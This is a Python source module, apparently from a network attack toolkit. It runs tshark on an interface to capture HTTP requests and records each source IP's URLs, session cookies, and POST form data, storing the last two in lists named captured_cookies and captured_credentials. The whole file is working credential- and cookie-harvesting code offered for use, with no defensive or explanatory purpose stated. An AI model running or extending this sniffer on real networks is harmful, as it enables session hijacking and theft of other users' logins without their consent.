"""
Traffic sniffer module using tshark for HTTP traffic capture.
"""

import signal
import subprocess
import threading


class TrafficSniffer:
    """Capture HTTP traffic using tshark."""

    def __init__(self, log_fn=None):
        self.log_fn = log_fn
        self.running = False
        self._proc = None
        self._thread = None
        self.lock = threading.Lock()
        self.captured_urls = []
        self.captured_cookies = []
        self.captured_credentials = []

    def _log(self, level, message):
        if self.log_fn:
            self.log_fn(level, f"[traffic] {message}")

    def start(self, interface) -> bool:
        """Start capturing HTTP traffic."""
        if self.running:
            return True

        try:
            self._proc = subprocess.Popen(
                [
                    "tshark", "-i", interface, "-Y", "http.request",
                    "-T", "fields",
                    "-e", "ip.src",
                    "-e", "http.host",
                    "-e", "http.request.uri",
                    "-e", "http.cookie",
                    "-e", "http.request.method",
                    "-e", "urlencoded-form.value",
                    "-l",
                ],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1
            )

            self.running = True
            self._thread = threading.Thread(target=self._parse_output, daemon=True)
            self._thread.start()

            self._log("info", f"Traffic sniffer started on {interface}")
            return True

        except FileNotFoundError:
            self._log("error", "tshark not found. Install with: sudo apt install tshark")
            return False
        except Exception as e:
            self._log("error", f"Traffic sniffer failed: {e}")
            return False

    def _parse_output(self):
        """Parse tshark output line by line."""
        while self.running and self._proc:
            try:
                line = self._proc.stdout.readline()
                if not line:
                    if self._proc.poll() is not None:
                        break
                    continue

                parts = line.strip().split("\t")
                if len(parts) < 3:
                    continue

                src_ip = parts[0] if len(parts) > 0 else ""
                host = parts[1] if len(parts) > 1 else ""
                uri = parts[2] if len(parts) > 2 else ""
                cookie = parts[3] if len(parts) > 3 else ""
                method = parts[4] if len(parts) > 4 else ""
                form_data = parts[5] if len(parts) > 5 else ""

                with self.lock:
                    if host and uri:
                        self.captured_urls.append({
                            "src": src_ip,
                            "host": host,
                            "uri": uri,
                            "method": method,
                        })
                        # Keep last 500
                        if len(self.captured_urls) > 500:
                            self.captured_urls = self.captured_urls[-500:]

                    if cookie:
                        self.captured_cookies.append({
                            "src": src_ip,
                            "host": host,
                            "cookie": cookie,
                        })
                        if len(self.captured_cookies) > 200:
                            self.captured_cookies = self.captured_cookies[-200:]

                    if form_data and method == "POST":
                        self.captured_credentials.append({
                            "src": src_ip,
                            "host": host,
                            "uri": uri,
                            "data": form_data,
                        })

            except Exception:
                continue

    def stop(self):
        """Stop traffic sniffer."""
        self.running = False
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGTERM)
                self._proc.wait(timeout=5)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None
        self._log("info", "Traffic sniffer stopped")

    def get_captured_data(self) -> dict:
        """Return all captured data."""
        with self.lock:
            return {
                "urls": list(self.captured_urls[-100:]),
                "cookies": list(self.captured_cookies[-50:]),
                "credentials": list(self.captured_credentials),
            }
